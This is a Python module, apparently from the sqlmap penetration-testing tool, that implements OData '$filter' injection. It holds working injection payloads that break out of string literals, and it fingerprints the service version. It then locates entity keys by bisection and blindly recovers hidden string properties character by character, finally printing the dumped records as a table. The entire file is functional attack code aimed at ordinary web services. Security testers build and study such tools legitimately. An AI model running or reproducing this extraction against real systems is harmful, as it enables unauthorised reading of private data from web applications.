#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

"""
OData injection ('--odata').

An application that builds an OData '$filter' from user input (?name= -> $filter=Name eq '<name>')
hands over the whole filter expression language. Breaking out of the string literal turns the filter
into an attacker-controlled boolean, which is a boolean-based blind oracle: the entity set the query
returns is populated or empty according to a condition sqlmap controls.

  detect   break the literal, then confirm a reproducible true/false differential (1 eq 1 vs 1 eq 2)
  confirm  an OData-only construct (length()/startswith() on a literal) that plain SQL does not parse,
           so the finding is attributed to OData rather than to ordinary SQL injection
  extract  through the oracle, pin an entity by its key and blindly recover each string property by
           length + substring binary search - reaching properties the endpoint never $select-ed

OData is fingerprinted by version: v4 speaks contains(), v2/v3 speak substringof(). Nothing is inferred
from a payload merely 'looking like' it worked - every step is a reproducible boolean differential or a
value the application cannot produce by itself.
"""

import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.common import urldecode
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.utils.nonsql import InconclusiveError
from lib.utils.nonsql import resolveBit
from lib.utils.nonsql import sqlErrorPresent
from lib.utils.nonsql import blockedStatus
from lib.utils.nonsql import ratio as _ratio
from lib.utils.nonsql import userDecision
from lib.utils.nonsql import userOracleActive
from lib.core.settings import HUFFMAN_PRIOR_WEIGHTS
from lib.core.settings import ODATA_CHAR_MAX
from lib.core.settings import ODATA_CHAR_MIN
from lib.core.settings import ODATA_CHARSET_BLOCK
from lib.core.settings import ODATA_COMMON_FIELDS
from lib.core.settings import ODATA_ERROR_REGEX
from lib.core.settings import ODATA_ERROR_SIGNATURES
from lib.core.settings import ODATA_KEY_CANDIDATES
from lib.core.settings import ODATA_MAX_KEY
from lib.core.settings import ODATA_MAX_LENGTH
from lib.core.settings import ODATA_MAX_RECORDS
from lib.core.settings import SQLMAP_ENVIRONMENT_PREFIX
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange
from thirdparty.six.moves.urllib.parse import quote as _quote


SENTINEL = randomStr(length=10, lowercase=True)

ODATA_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)

Boundary = namedtuple("Boundary", ("prefix", "suffix"))

# Detection boundaries, priority-ordered. Each breaks out of the string literal and rebuilds a filter
# whose truth is (predicate): the base value matches nothing and the trailing "'1' eq '2'" is false, so
# the injected predicate alone decides whether any entity is returned. prefix/suffix wrap a later
# predicate for extraction.
#   (true_break, false_break, prefix, suffix)
_BOUNDARY_TABLE = (
    # single-quoted string literal (OData escapes an inner quote by doubling it, hence no backslashes)
    ("' or (1 eq 1) or '1' eq '2", "' or (1 eq 2) or '1' eq '2", "' or (", ") or '1' eq '2"),
    # double-quoted string literal (some services accept "..." literals)
    ('" or (1 eq 1) or "1" eq "2', '" or (1 eq 2) or "1" eq "2', '" or (', ') or "1" eq "2'),
)

# Charset for blind character recovery.
# NOTE recovery uses EXACT equality (substring(...) eq 'c'), never a '>=' bisection: .NET / OData string
# relational comparison is culture-aware and case-folding ('l' and 'L' compare equal), which scrambles a
# lexicographic bisection, whereas eq is ordinal and exact. Bisection is recovered WITHOUT ordering by
# asking about a whole candidate set per request (see _memberOf), so the set is ordered by real-world
# frequency - a common character is settled inside the first block. Because the probe is exact rather
# than positional, the order is free and a missing codepoint only costs coverage - it cannot alias onto
# a neighbour the way a bisection hole does. Nothing is excluded: the one character OData cannot carry
# raw inside a literal, the single quote, is doubled per the spec instead of dropped.
_FREQ = (tuple(xrange(ord('a'), ord('z') + 1)) + tuple(xrange(ord('A'), ord('Z') + 1)) +
         tuple(xrange(ord('0'), ord('9') + 1)) + tuple(ord(_) for _ in " @._-+:/!#$%&*=?"))
_CS_ORDS = []
for _o in _FREQ:
    if ODATA_CHAR_MIN <= _o <= ODATA_CHAR_MAX and _o not in _CS_ORDS:
        _CS_ORDS.append(_o)
for _o in xrange(ODATA_CHAR_MIN, ODATA_CHAR_MAX + 1):
    if _o not in _CS_ORDS:
        _CS_ORDS.append(_o)

# ...and weighted by the same shipped character prior blind SQL retrieval banks on, so a set is split
# at its cumulative-WEIGHT midpoint rather than its midpoint by count. That puts the likely characters
# nearer the root of the decision tree, which is what beats a uniform bisection's flat log2(charset).
_CS_WEIGHTS = dict((_o, HUFFMAN_PRIOR_WEIGHTS.get(_o, 1)) for _o in _CS_ORDS)
_CS_ORDS.sort(key=lambda _o: -_CS_WEIGHTS[_o])


def _splitPoint(candidates):
    """Where to cut `candidates` so that either answer is about equally likely (never degenerate)."""

    half = sum(_CS_WEIGHTS[_] for _ in candidates) / 2.0
    running = 0
    for index, ordinal in enumerate(candidates):
        running += _CS_WEIGHTS[ordinal]
        if running >= half:
            return min(index + 1, len(candidates) - 1)
    return len(candidates) - 1


def _literal(ordinal):
    """One codepoint as a single-quoted OData string literal (an inner quote is doubled, not escaped)."""
    return "'%s'" % ("''" if ordinal == 0x27 else chr(ordinal))


def _delim(place):
    return conf.paramDel or (';' if place == PLACE.COOKIE else '&')


def _confParameters(place):
    return conf.parameters.get(place) or ""


def _originalValue(place, parameter):
    # decoded on the way in, re-encoded by _send() on the way out, so the module works in plain text
    # and a value carrying %XX/'+' round-trips to exactly what the application originally received
    for pair in _confParameters(place).split(_delim(place)):
        if '=' in pair:
            name, _, value = pair.partition('=')
            if name.strip() == parameter:
                return urldecode(value, convall=True)
    return None


def _replaceSegment(place, parameter, value):
    retVal = []
    for pair in _confParameters(place).split(_delim(place)):
        if '=' in pair:
            name, _, old = pair.partition('=')
            retVal.append("%s=%s" % (name, value if name.strip() == parameter else old))
        elif pair:
            retVal.append(pair)
    return _delim(place).join(retVal)


def _send(place, parameter, value, raw=False):
    """One HTTP request with the target parameter set to `value`, reusing sqlmap's request machinery.
    `raw=True` keeps a 4xx/5xx body (a $filter parser diagnostic is served as 400) which the boolean
    oracle must never see.

    The value is URL-encoded (as '--ssti' already does) because a payload metacharacter otherwise never
    reaches the service intact: a raw '&' is the parameter delimiter, so the request SPLITS and the
    $filter arrives truncated, and '+' arrives as a space. That is not hypothetical - the character scan
    emits both as data, and unencoded the '&' probe returned a 400 whose InconclusiveError aborted the
    WHOLE property, so any value holding one of them dumped as '?'."""

    if conf.delay:
        time.sleep(conf.delay)

    saved = conf.parameters.get(place, "")
    conf.parameters[place] = _replaceSegment(place, parameter, _quote(value, safe=""))
    try:
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
        page, _, code = Request.getPage(raise404=False, silent=True)
        if not raw and (blockedStatus(code) or (code and code >= 400)):
            return None
        return page or ""
    except Exception as ex:
        logger.debug("OData probe request failed: %s" % getUnicode(ex))
        return None
    finally:
        conf.parameters[place] = saved


def _isError(page):
    page = getUnicode(page or "")
    return bool(re.search(ODATA_ERROR_REGEX, page)) or sqlErrorPresent(page)


def _backendFromError(page):
    page = getUnicode(page or "")
    for backend, regex in ODATA_ERROR_SIGNATURES:
        if re.search(regex, page):
            return backend
    return None


def _probeError(place, parameter):
    """Break the filter and look for an OData $filter parser diagnostic (served as 400). A hint only."""

    original = _originalValue(place, parameter) or "1"
    normal = _send(place, parameter, original, raw=True)
    for suffix in ("'", '"', ")", " eq "):
        broken = _send(place, parameter, original + suffix, raw=True)
        if not broken or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
            continue
        backend = _backendFromError(broken)
        if backend and not _isError(normal):
            return backend, broken
    return None, None


def _boolean(truthy, falsy):
    truePage = truthy()
    if truePage is None or _isError(truePage):
        return None
    if _ratio(truePage, truthy()) < UPPER_RATIO_BOUND:
        return None
    falsePage = falsy()
    if falsePage is None or _isError(falsePage):
        return None
    if _ratio(falsePage, falsy()) < UPPER_RATIO_BOUND:
        return None
    if userOracleActive():
        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None
    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage
    return None


def _detectBoolean(place, parameter):
    for trueBreak, falseBreak, prefix, suffix in _BOUNDARY_TABLE:
        truePayload = SENTINEL + trueBreak
        falsePayload = SENTINEL + falseBreak
        template = _boolean(lambda p=truePayload: _send(place, parameter, p),
                            lambda p=falsePayload: _send(place, parameter, p))
        if template:
            return template, truePayload, Boundary(prefix, suffix)
    return None, None, None


def _wrap(boundary, predicate):
    return "%s%s%s%s" % (SENTINEL, boundary.prefix, predicate, boundary.suffix)


# OData-only attribution: length()/startswith() over a string LITERAL are OData $filter functions with no
# plain-SQL equivalent, so a true/false divergence attributes the finding to OData rather than SQL. No
# property name is needed, so this runs before any field is known.
_ODATA_PREDICATES = (
    ("length('%s') eq 6" % ("sqlmap"), "length('%s') eq 5" % ("sqlmap")),
    ("startswith('sqlmap','sql')", "startswith('sqlmap','xyz')"),
)


def _confirmOData(place, parameter, boundary):
    for truePred, falsePred in _ODATA_PREDICATES:
        if _boolean(lambda p=_wrap(boundary, truePred): _send(place, parameter, p),
                    lambda p=_wrap(boundary, falsePred): _send(place, parameter, p)):
            return True
    return False


def _fingerprintVersion(oracle):
    """v4 speaks contains(); v2/v3 speak substringof(). Whichever parses-and-evaluates names the dialect.

    Both probes are EXPECTED to fail on the dialect that does not own them - an unknown $filter function
    is a 400, which the oracle can only report as inconclusive. That is a negative answer here, not an
    error: raising would abort the scan before the finding is even reported, and it would do so on
    exactly the v2/v3 services the second branch exists to name."""

    for expression, version in (("contains('sqlmap','sql')", "v4"),
                                ("substringof('sql','sqlmap')", "v2/v3")):
        try:
            if oracle(expression):
                return version
        except InconclusiveError:
            continue
    return None


def _makeOracle(place, parameter, boundary, truePredicate="(1 eq 1)"):
    """Build a boolean oracle whose TRUE model is the result of `truePredicate` and FALSE model is the
    empty set. For detection the true model is the whole entity set ((1 eq 1)); for per-entity extraction
    it is a single pinned entity (key eq K), so a `key eq K and <cond>` probe - which returns that one
    entity or nothing - matches the two models exactly. Returns None when the models are not separable."""

    cache = {}

    def request(payload):
        if payload not in cache:
            page = _send(place, parameter, payload)
            if page is not None and not _isError(page):
                cache[payload] = page
            return page
        return cache[payload]

    truePayload = _wrap(boundary, truePredicate)
    falsePayload = _wrap(boundary, "(1 eq 2)")
    trueTemplate = request(truePayload)
    falseTemplate = request(falsePayload)

    if trueTemplate is None or falseTemplate is None or _isError(trueTemplate) or _isError(falseTemplate):
        return None
    if _ratio(trueTemplate, _send(place, parameter, truePayload)) < UPPER_RATIO_BOUND:
        return None
    if _ratio(falseTemplate, _send(place, parameter, falsePayload)) < UPPER_RATIO_BOUND:
        return None
    if _ratio(trueTemplate, falseTemplate) >= UPPER_RATIO_BOUND:
        return None

    def truth(predicate):
        payload = _wrap(boundary, predicate)
        page = request(payload)
        usable = page if (page is not None and not _isError(page)) else None

        def fresh():
            p = _send(place, parameter, payload)
            return None if (p is None or _isError(p)) else p
        return resolveBit(usable, trueTemplate, falseTemplate, fresh)

    truth.template = trueTemplate
    truth.cache = cache
    return truth


def _hasErrorSurface(place, parameter, boundary):
    """True when an unknown property really does surface as an error. The cheap existence oracle below is
    an error/no-error split, so on an endpoint that SWALLOWS the service's 400 it answers 'exists' for
    EVERY name - which reported all 37 candidate properties as reachable and dumped a wall of empty
    columns. Probing a name that cannot exist tells the two apart in one request."""

    payload = _wrap(boundary, "(%s ne null)" % randomStr(length=12, lowercase=True))
    page = _send(place, parameter, payload, raw=True)
    return page is None or _isError(page)


def _fieldExists(place, parameter, boundary, field):
    """A property that does not exist makes the whole $filter error (400), while an existing one filtered
    to false returns 200-empty. So a raw error/no-error split is the existence oracle - but only where
    _hasErrorSurface() confirmed the endpoint actually leaks that difference."""

    payload = _wrap(boundary, "(%s ne null)" % field)
    page = _send(place, parameter, payload, raw=True)
    return page is not None and not _isError(page)


def _fieldExistsBlind(oracle, key, keyValue, field):
    """Existence WITHOUT an error surface, for an endpoint that renders a failed $filter as its ordinary
    empty page. 'length(P) ge 0' is true for any property that exists, while an unknown one makes the
    whole filter fail and the endpoint then serves exactly the FALSE model - so the boolean oracle
    separates them cleanly. One request per candidate, same as the error-based check, and it keeps the
    automatic dump working on a blind target instead of surrendering it."""

    try:
        return oracle("(%s eq %d and length(%s) ge 0)" % (key, keyValue, field))
    except InconclusiveError:
        return False


def _present(place, parameter, boundary, emptyPage, predicate):
    """True when `predicate` returns at least one entity, decided by a direct comparison against the known
    EMPTY page rather than the ratio oracle - used to discover which key values exist WITHOUT assuming a
    per-entity model yet. A partial/multi-row result is fine here: anything that differs from empty counts
    as present."""

    page = _send(place, parameter, _wrap(boundary, predicate))
    if page is None or _isError(page):
        return False
    return _ratio(page, emptyPage) < UPPER_RATIO_BOUND


def _lowestKey(place, parameter, boundary, emptyPage, candidate):
    """The smallest existing value of a numeric key, found by bisecting on a RANGE predicate.

    Walking up from 1 only works when the keys start near 1. Real services hand out identities from a
    seed (1000, 100000, an epoch), and the old upward walk gave up after its run of misses and reported
    'no numeric key property found' on a perfectly dumpable entity set. `ge` answers over a whole range
    at once, so ~17 requests locate the first key wherever it sits."""

    lo, hi = 0, ODATA_MAX_KEY
    if not _present(place, parameter, boundary, emptyPage, "(%s ge %d)" % (candidate, lo)):
        return None
    while lo < hi:
        mid = (lo + hi) // 2
        if _present(place, parameter, boundary, emptyPage, "(%s le %d)" % (candidate, mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


def _findKeyAndEntities(place, parameter, boundary, emptyPage, errorSurface=True):
    """Pick a numeric key property and the key values that actually exist (bounded). Every probe stays a
    single-entity 0/1-row answer, which the per-entity oracle can classify.

    The error-based pre-check only earns its request where the endpoint HAS an error surface; without one
    it answers 'exists' for every name, so the range probe below - which compares against the known empty
    page and so needs no error at all - is left to reject the candidate on its own."""

    for candidate in ODATA_KEY_CANDIDATES:
        if errorSurface and not _fieldExists(place, parameter, boundary, candidate):
            continue
        start = _lowestKey(place, parameter, boundary, emptyPage, candidate)
        if start is None:
            continue
        present = []
        misses = 0
        value = start - 1
        # scan upward from the first real key; stop after a run of absent ids (sparse keys) or once
        # enough are collected
        while value < ODATA_MAX_KEY and len(present) < ODATA_MAX_RECORDS and misses < 32:
            value += 1
            if _present(place, parameter, boundary, emptyPage, "(%s eq %d)" % (candidate, value)):
                present.append(value)
                misses = 0
            else:
                misses += 1
        if present:
            if len(present) >= ODATA_MAX_RECORDS:
                logger.warning("stopped at the %d-entity cap, so further entities are left undumped "
                               "(raise it with %s_ODATA_MAX_RECORDS)" % (ODATA_MAX_RECORDS, SQLMAP_ENVIRONMENT_PREFIX))
            return candidate, present
    return None, []


def _memberOf(oracle, pin, field, pos, ordinals, useIn):
    """One request asking whether the character at `pos` is ANY of `ordinals`."""

    substring = "substring(%s,%d,1)" % (field, pos)
    if useIn:
        return oracle("(%s%s in (%s))" % (pin, substring, ",".join(_literal(_) for _ in ordinals)))
    return oracle("(%s(%s))" % (pin, " or ".join("%s eq %s" % (substring, _literal(_)) for _ in ordinals)))


def _supportsIn(oracle, pin):
    """Whether the service speaks the v4.01 `in` operator, settled by a differential so one that merely
    tolerates the syntax cannot fake it. Both spellings ask the identical question, but `in` costs the
    parser a SINGLE node against ~8 per candidate for the disjunction, and the ceiling is real: ASP.NET
    Core OData allows 100 nodes by default (MaxNodeCount) and was measured rejecting an 11-term
    disjunction outright. So `in`, where offered, buys headroom on a service configured stricter than
    the default rather than a bigger question."""

    try:
        return oracle("(%s'a' in ('a','b'))" % pin) and not oracle("(%s'a' in ('b','c'))" % pin)
    except InconclusiveError:
        return False


def _inferField(oracle, key, keyValue, field, maxLen=ODATA_MAX_LENGTH, useIn=None):
    """Blindly recover one string property of the entity pinned by key==keyValue: length by binary
    search, then each character by set-membership bisection. OData substring() is 0-indexed, so
    character `pos` (1-based) is substring(field,pos-1,1)."""

    pin = "%s eq %d and " % (key, keyValue)
    try:
        if useIn is None:
            useIn = _supportsIn(oracle, pin)
        if not oracle("(%slength(%s) ge 1)" % (pin, field)):
            return ""
        lo, hi = 1, maxLen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if oracle("(%slength(%s) ge %d)" % (pin, field, mid)):
                lo = mid
            else:
                hi = mid - 1
        length = lo

        if length >= maxLen:
            # the bisection is bounded, so a value at the bound is a FLOOR, not a measurement - saying
            # nothing here hands back a prefix that reads exactly like a complete value
            logger.warning("property '%s' is at least %d characters; the recovered value is truncated "
                           "at the cap (raise it with %s_ODATA_MAX_LENGTH)" % (field, maxLen, SQLMAP_ENVIRONMENT_PREFIX))

        chars = []
        for pos in xrange(length):
            # A whole candidate set is asked about in ONE request, so a probe halves the space just as
            # a relational bisection would - without ever leaving `eq`, the only comparison .NET does
            # not case-fold. The weight-ordered blocks are tried in turn, so a likely character is
            # settled by the first of them and never pays for the rest of the charset.
            recovered = "?"
            for start in xrange(0, len(_CS_ORDS), ODATA_CHARSET_BLOCK):
                candidates = _CS_ORDS[start:start + ODATA_CHARSET_BLOCK]
                if not _memberOf(oracle, pin, field, pos, candidates, useIn):
                    continue
                while len(candidates) > 1:
                    # membership in `candidates` is established, so the untested side is implied
                    cut = _splitPoint(candidates)
                    candidates = (candidates[:cut] if _memberOf(oracle, pin, field, pos, candidates[:cut], useIn)
                                  else candidates[cut:])
                recovered = chr(candidates[0])
                break
            chars.append(recovered)
    except InconclusiveError:
        logger.warning("OData extraction aborted for '%s' (oracle inconclusive after retries)" % field)
        return None
    return "".join(chars)


def _grid(columns, rows):
    columns = [getUnicode(_) for _ in columns]
    rows = [[getUnicode(_) for _ in row] for row in rows]
    widths = []
    for index, column in enumerate(columns):
        width = len(column)
        for row in rows:
            if index < len(row):
                width = max(width, len(getUnicode(row[index])))
        widths.append(width)
    separator = "+-" + "-+-".join("-" * _ for _ in widths) + "-+"

    def line(cells):
        return "| " + " | ".join((getUnicode(cells[index]) if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"

    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])


def _dumpEntities(place, parameter, boundary, emptyPage):
    """Find a key and the entities that exist, enumerate which common string properties are reachable,
    then blind-read them for each entity - reaching properties the endpoint never $select-ed. A fresh
    oracle is calibrated PER entity (true model = that one entity, false model = empty) so a
    'key eq K and <cond>' probe, which returns that entity or nothing, matches the two models exactly."""

    errorSurface = _hasErrorSurface(place, parameter, boundary)
    if not errorSurface:
        logger.debug("this endpoint swallows the service's $filter errors, so property existence is "
                     "decided through the boolean oracle instead of an error/no-error split")

    key, keys = _findKeyAndEntities(place, parameter, boundary, emptyPage, errorSurface)
    if not key:
        logger.info("no numeric key property found among %s; reporting detection only"
                    % ", ".join(ODATA_KEY_CANDIDATES[:4]))
        return

    if errorSurface:
        reachable = [_ for _ in ODATA_COMMON_FIELDS if _ != key and _fieldExists(place, parameter, boundary, _)]
    else:
        probe = _makeOracle(place, parameter, boundary, truePredicate="(%s eq %d)" % (key, keys[0]))
        if probe is None:
            logger.info("property enumeration needs a per-entity oracle this endpoint does not support; "
                        "reporting detection only")
            return
        reachable = [_ for _ in ODATA_COMMON_FIELDS if _ != key and _fieldExistsBlind(probe, key, keys[0], _)]

    fields = [key] + reachable
    logger.info("key property '%s'; %d entit%s; reachable properties: %s"
                % (key, len(keys), "y" if len(keys) == 1 else "ies", ", ".join(fields)))

    rows = []
    useIn = None
    for value in keys:
        oracle = _makeOracle(place, parameter, boundary, truePredicate="(%s eq %d)" % (key, value))
        if oracle is None:
            continue
        if useIn is None:
            # a property of the service, not of the entity, so it is settled once for the whole dump
            useIn = _supportsIn(oracle, "%s eq %d and " % (key, value))
            logger.debug("service %s the 'in' operator, so one probe covers %d candidate character(s)"
                         % ("speaks" if useIn else "does not speak", len(_CS_ORDS) if useIn else ODATA_CHARSET_BLOCK))
        row = [str(value)]
        for field in fields[1:]:
            recovered = _inferField(oracle, key, value, field, useIn=useIn)
            row.append("?" if recovered is None else recovered)
        rows.append(row)

    if rows:
        conf.dumper.singleString("OData: entities dumped through '$filter' (%d)\n%s"
                                 % (len(rows), _grid(fields, rows)))


def odataScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--odata' is self-contained: it detects OData '$filter' injection in HTTP parameters and "
    debugMsg += "blindly dumps the reachable entities. SQL enumeration switches (--banner, --dbs, "
    debugMsg += "--tables, --users, --sql-query) are ignored"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = found = 0

    for place in (_ for _ in ODATA_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing OData injection on %s parameter '%s'" % (place, parameter))

            backendHint, _errorPage = _probeError(place, parameter)
            if backendHint:
                logger.info("%s parameter '%s' reaches an OData service (framework: '%s')" % (place, parameter, backendHint))

            template, payload, boundary = _detectBoolean(place, parameter)
            if not template:
                continue

            isOData = _confirmOData(place, parameter, boundary) or bool(backendHint)
            if not isOData:
                logger.info("%s parameter '%s' shows a boolean differential but no OData-only construct "
                            "confirmed it; not attributing to OData (may be plain SQL injection)"
                            % (place, parameter))
                continue

            found += 1
            if conf.beep:
                beep()

            detectOracle = _makeOracle(place, parameter, boundary)
            version = _fingerprintVersion(detectOracle) if detectOracle else None
            backend = backendHint or "Generic OData"
            versionMsg = " %s" % version if version else ""
            logger.info("%s parameter '%s' is vulnerable to OData injection (framework: '%s'%s)"
                        % (place, parameter, backend, versionMsg))
            conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: OData injection\n"
                                     "    Title: OData $filter boolean-based blind\n    Payload: %s=%s\n---"
                                     % (parameter, place, parameter, payload))

            if detectOracle is None:
                logger.info("extraction disabled (true/false models not reliably separable); detection stands")
                continue

            emptyPage = _send(place, parameter, _wrap(boundary, "(1 eq 2)"))
            if emptyPage is not None:
                _dumpEntities(place, parameter, boundary, emptyPage)

    if not found:
        if tested:
            logger.warning("no parameter appears to be injectable via OData injection (%d tested)" % tested)
        else:
            logger.warning("no parameters found to test for OData injection")

    logger.info("OData scan complete")
